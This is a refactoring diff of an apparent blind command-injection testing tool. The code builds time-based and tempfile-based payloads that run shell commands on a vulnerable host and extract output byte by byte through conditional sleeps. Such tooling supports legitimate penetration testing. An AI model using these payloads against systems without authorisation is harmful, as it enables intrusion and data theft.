@@ -48,14 +48,11 @@ def _write_and_measure(cmd, j, OUTPUT_TEXTFILE, timesec, separator, operator):
   return settings.EVAL_GRAMMAR.sequence(_write(cmd, OUTPUT_TEXTFILE),
                                         _conditional_sleep(condition, timesec, separator))
 
-# The shell's comparison operators, as the language being evaluated spells them.
-COMPARISON = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">", "-eq": "==", "-ne": "!="}
-
 """
 Tempfile-based decision payload (check if host is vulnerable).
 """
 def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
-  return _write_and_measure("echo " + TAG, j, OUTPUT_TEXTFILE, timesec, separator, "==")
+  return _write_and_measure("echo " + TAG, j, OUTPUT_TEXTFILE, timesec, separator, settings.EVAL_GRAMMAR.COMPARISON["-eq"])
 
 """
 __Warning__: The alternative shells are still experimental.
@@ -71,9 +68,9 @@ def condition_check(separator, condition, timesec, http_request_method):
   condition = condition.strip()
   if condition.startswith("-s "):
     # Read the way the contents are read anywhere else here, so no quote has to survive a boundary.
-    condition = settings.EVAL_GRAMMAR.length(_contents(condition[3:].strip())) + ">0"
+    condition = settings.EVAL_GRAMMAR.length(_contents(condition[3:].strip())) + settings.EVAL_GRAMMAR.COMPARISON["-gt"] + "0"
   else:
-    for shell_operator, operator in COMPARISON.items():
+    for shell_operator, operator in settings.EVAL_GRAMMAR.COMPARISON.items():
       condition = condition.replace(settings.SINGLE_WHITESPACE + shell_operator + settings.SINGLE_WHITESPACE, operator)
   return _conditional_sleep(condition, timesec, separator)
 
@@ -89,7 +86,7 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
   settings.USER_APPLIED_CMD = cmd
-  return _write_and_measure(cmd, j, OUTPUT_TEXTFILE, timesec, separator, COMPARISON.get(operator, "<="))
+  return _write_and_measure(cmd, j, OUTPUT_TEXTFILE, timesec, separator, settings.EVAL_GRAMMAR.COMPARISON[operator])
 
 """
 __Warning__: The alternative shells are still experimental.
@@ -104,7 +101,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
   # The guess stays left of the operator, as it does elsewhere: the search reads the answer as "the
   # byte is at or above this", and an operand order of its own would send it into the wrong half.
   ordinal = settings.EVAL_GRAMMAR.ordinal(_contents(OUTPUT_TEXTFILE), num_of_chars - 1)
-  return _conditional_sleep(str(ascii_char) + COMPARISON.get(operator, "<=") + ordinal, timesec, separator)
+  return _conditional_sleep(str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON[operator] + ordinal, timesec, separator)
 
 """
 __Warning__: The alternative shells are still experimental.
@@ -119,7 +116,7 @@ What the file holds here is a small sum, and the caller looks for it among the v
 been - so the contents are read as a number rather than indexed for the ordinal of a byte.
 """
 def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
-  condition = str(ascii_char) + "==" + settings.EVAL_GRAMMAR.to_number(_contents(OUTPUT_TEXTFILE))
+  condition = str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON["-eq"] + settings.EVAL_GRAMMAR.to_number(_contents(OUTPUT_TEXTFILE))
   return _conditional_sleep(condition, timesec, separator)
 
 """
@@ -150,7 +147,7 @@ contents are not yet known to be readable at all.
 """
 def oracle_decision(separator, TAG, output_length, OUTPUT_TEXTFILE, holds=True):
   expected = str(output_length if holds else output_length + 1)
-  condition = settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE)) + "==" + expected
+  condition = settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE)) + settings.EVAL_GRAMMAR.COMPARISON["-eq"] + expected
   payload = settings.EVAL_GRAMMAR.sequence(_write("echo " + TAG, OUTPUT_TEXTFILE), settings.EVAL_GRAMMAR.halt(condition))
   return payload + _end(separator)
 
@@ -159,7 +156,7 @@ How many bytes the created file holds, asked as a comparison so that it can be b
 length rather than the command's, read without running the command again.
 """
 def oracle_get_length(separator, OUTPUT_TEXTFILE, candidate_length, operator="-ge"):
-  condition = settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE)) + COMPARISON.get(operator, ">=") + str(candidate_length)
+  condition = settings.EVAL_GRAMMAR.length(_contents(OUTPUT_TEXTFILE)) + settings.EVAL_GRAMMAR.COMPARISON[operator] + str(candidate_length)
   return settings.EVAL_GRAMMAR.halt(condition) + _end(separator)
 
 """
@@ -168,7 +165,7 @@ Whether the ordinal of the created file's Nth byte is at or above this one, whic
 """
 def oracle_get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator="-le"):
   ordinal = settings.EVAL_GRAMMAR.ordinal(_contents(OUTPUT_TEXTFILE), num_of_chars - 1)
-  condition = str(ascii_char) + COMPARISON.get(operator, "<=") + ordinal
+  condition = str(ascii_char) + settings.EVAL_GRAMMAR.COMPARISON[operator] + ordinal
   return settings.EVAL_GRAMMAR.halt(condition) + _end(separator)
 
 # eof
